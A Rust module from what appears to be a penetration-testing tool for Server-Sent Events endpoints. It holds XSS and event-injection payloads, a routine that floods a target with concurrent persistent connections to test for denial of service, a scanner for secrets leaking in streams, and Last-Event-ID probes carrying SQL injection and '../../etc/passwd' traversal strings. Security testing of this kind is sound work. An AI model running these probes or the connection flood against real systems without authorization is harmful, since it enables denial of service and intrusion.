use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SSE Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).header("Accept", "text/event-stream").send().await?;
    let content_type = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
    let is_sse = content_type.contains("text/event-stream");

    if !is_sse {
        println!("  {} Endpoint is not SSE (Content-Type: {}).", "[-]".yellow().bold(), content_type);
        return Ok(());
    }

    println!("  {} SSE endpoint confirmed (Content-Type: {})", "[+]".green().bold(), content_type);

    let payloads = [
        ("XSS via data:", "data: <img src=x onerror=alert(1)>\n\n"),
        ("Event injection", "event: admin\ndata: {\"role\":\"admin\"}\n\n"),
        ("ID injection", "id: 999\ndata: poisoned\n\n"),
        ("Multi-line XSS", "data: line1\ndata: <script>alert(1)</script>\n\n"),
        ("Comment injection", ": injected comment\ndata: test\n\n"),
        ("Retry manipulation", "retry: 1\ndata: fast_reconnect\n\n"),
    ];

    println!("\n  {} Injection payloads (inject into SSE stream data):", "[*]".cyan().bold());
    for (name, payload) in &payloads {
        let escaped = payload.replace('\n', "\\n");
        println!("    {} {:25} {}", "*".cyan(), name, escaped);
    }

    println!("\n{} If SSE data is reflected without sanitization, XSS is possible.", "[*]".cyan().bold());
    Ok(())
}

pub async fn exhaust(url: &str, count: u32, timeout: u64) -> anyhow::Result<()> {
    println!("{} SSE Connection Exhaustion", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} Connections: {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut handles = Vec::new();

    for i in 0..count {
        let client = client.clone();
        let url = url.to_string();
        handles.push(tokio::spawn(async move {
            let resp = client.get(&url)
                .header("Accept", "text/event-stream")
                .header("Cache-Control", "no-cache")
                .header("X-Connection-ID", format!("{}", i))
                .timeout(Duration::from_secs(60))
                .send().await;
            match resp {
                Ok(r) => (r.status().as_u16(), true),
                Err(_) => (0u16, false),
            }
        }));
    }

    let mut ok = 0u32;
    let mut err = 0u32;
    for h in handles {
        if let Ok((_, success)) = h.await {
            if success { ok += 1; } else { err += 1; }
        } else { err += 1; }
    }

    println!("\n{} {} connections held, {} errors", "[*]".cyan().bold(), ok, err);
    if ok > 50 { println!("{} Target allows many persistent SSE connections — DoS vector.", "[!]".red().bold()); }
    Ok(())
}

pub async fn exfil(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SSE Data Exfiltration Channel", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).header("Accept", "text/event-stream").send().await?;
    let content_type = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();

    if !content_type.contains("text/event-stream") {
        println!("  {} Not an SSE endpoint.", "[-]".yellow().bold());
        return Ok(());
    }

    let body = resp.text().await.unwrap_or_default();
    let events: Vec<&str> = body.split("\n\n").filter(|e| !e.is_empty()).collect();
    println!("  {} Received {} events", "*".cyan(), events.len());

    let sensitive_patterns = ["token", "secret", "password", "key", "auth", "session", "user", "email", "ssn", "credit"];
    let mut leaks = Vec::new();
    for event in &events {
        for pattern in &sensitive_patterns {
            if event.to_lowercase().contains(pattern) {
                let preview = event.chars().take(100).collect::<String>();
                leaks.push((pattern.to_string(), preview));
            }
        }
    }

    if leaks.is_empty() {
        println!("  {} No sensitive data detected in SSE stream.", "[-]".green().bold());
    } else {
        println!("\n  {} Potential data leaks in SSE stream:", "[!]".red().bold());
        for (pattern, preview) in leaks.iter().take(10) {
            println!("    {} [{}] {}", "*".red(), pattern, preview);
        }
    }

    println!("\n{} SSE provides a persistent covert channel for data exfiltration.", "[*]".cyan().bold());
    Ok(())
}

pub async fn replay(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SSE Event Replay Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let last_event_ids = [
        "0", "1", "999", "-1", "0;../../etc/passwd",
        "0' OR '1'='1", "0 UNION SELECT 1--",
        "999999999", "null", "undefined", "[]", "{}",
    ];

    for id in &last_event_ids {
        let start = std::time::Instant::now();
        match client.get(url)
            .header("Accept", "text/event-stream")
            .header("Last-Event-ID", *id)
            .send().await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let elapsed = start.elapsed();
                let event_count = body.split("\n\n").filter(|e| !e.is_empty()).count();
                let tag = if event_count > 0 { format!("{} events", event_count) } else { "no events".to_string() };
                println!("  {} {:30} status={} {} ({}ms)", "*".cyan(), format!("Last-Event-ID: {}", id), status, tag, elapsed.as_millis());
            }
            Err(_) => { println!("  {} {:30} error", "*".red(), format!("Last-Event-ID: {}", id)); }
        }
    }

    println!("\n{} Last-Event-ID can trigger event replay or injection if not validated.", "[*]".cyan().bold());
    Ok(())
}
